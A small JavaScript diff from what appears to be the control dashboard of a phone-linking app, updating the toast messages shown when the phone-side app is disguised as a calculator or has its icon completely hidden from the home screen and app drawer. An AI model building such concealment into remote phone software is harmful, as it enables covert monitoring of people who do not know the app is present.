@@ -854,8 +854,12 @@ function titleOrApp(appName, title, text) {
         case 'CAMOUFLAGE_STATUS': {
           if (p.deviceId) {
             setCamouflageConfig((prev) => ({ ...prev, [p.deviceId]: p }));
-            if (p.calculatorDisguise !== undefined) {
-              pushToast(p.calculatorDisguise ? '🧮 Calculator camouflage active on phone' : 'Standard PhoneLink icon active', 'info');
+            if (p.hideAppIcon) {
+              pushToast('👻 App icon completely hidden on phone home screen & drawer', 'info');
+            } else if (p.calculatorDisguise) {
+              pushToast('🧮 Calculator camouflage active on phone', 'info');
+            } else if (p.calculatorDisguise !== undefined || p.hideAppIcon !== undefined) {
+              pushToast('Standard PhoneLink icon active', 'info');
             }
           }
           break;
